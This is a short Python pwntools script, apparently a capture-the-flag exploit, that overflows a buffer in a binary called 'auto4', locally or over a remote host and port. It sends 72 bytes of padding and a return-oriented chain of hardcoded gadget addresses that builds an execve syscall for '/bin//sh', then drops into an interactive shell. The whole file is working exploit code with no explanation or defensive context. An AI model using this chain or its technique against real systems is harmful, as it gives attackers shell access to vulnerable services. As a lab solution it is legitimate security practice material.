#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
    
    r.recvuntil('rent?')
    r.sendline('A')
    r.recvuntil('owner?')
    ex = 'A' * 72

    ex += struct.pack("<L", 0x08056cc0) 	#XOR eax,eax; ret
    ex += struct.pack("<L", 0x0807cbda) * 11 	#INC eax; ret
    ex += struct.pack("<L", 0x0806f771) 	#POP edx; pop ecx; pop ebx; ret
    ex += struct.pack("<L", 0xffffde78)		#0
    ex += struct.pack("<L", 0xffffde78)		#0
    ex += struct.pack("<L", 0xffffde70)		#bin//sh
    ex += struct.pack("<L", 0x08070080)		#0x80
    ex += '/bin//sh'
   
    r.sendline(ex)
    
    
    
    r.interactive()
    
if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./auto4'], env={})
        print util.proc.pidof(r)
        pause()
        exploit(r)
        pause()
